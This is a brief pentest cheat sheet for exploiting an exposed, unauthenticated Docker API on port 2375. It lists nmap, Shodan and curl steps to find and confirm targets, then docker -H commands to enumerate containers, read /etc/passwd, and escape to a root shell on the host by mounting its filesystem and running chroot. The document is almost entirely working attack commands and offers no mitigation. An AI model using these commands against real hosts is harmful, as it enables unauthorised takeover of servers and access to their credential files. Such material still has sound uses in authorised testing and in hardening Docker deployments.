# Exposed Docker API

## Prerequisites

Misconfigurations on the systemd unit file

    /lib/systemd/system/docker.service

Misconfigurations on the daemon.json file

    /etc/docker/daemon.json

Vulnerable misconfiguration

    tcp://0.0.0.0:2375

## Identification

### 1) Scan 

    nmap -sV -p 2375 IP_RANGE

### 2) Verify

    curl http://TARGET_IP:2375/version

If the server returns a JSON object containing the Docker version, Go version, and OS details, the API is exposed

### 3) List all running containers

    curl http://TARGET_IP:2375/containers/json

### 4) Shodan query

    port:2375

## Gather Information

### 1) List all images on the remote host

    docker -H tcp://TARGET_IP:2375 images

### 2) List all containers (inclusing stopped ones)

    docker -H tcp://TARGET_IP:2375 ps -a

## Remote Code Execution (RCE)

### 1) Pull a lightweight image like alpine, then execute commands inside it

    docker -H tcp://TARGET_IP:2375 run alpine cat /etc/passwd

### 2) Escape to the host via Volume Mounting

    docker -H tcp://TARGET_IP:2375 run -it -v /:/mnt/host alpine chroot /mnt/host /bin/sh
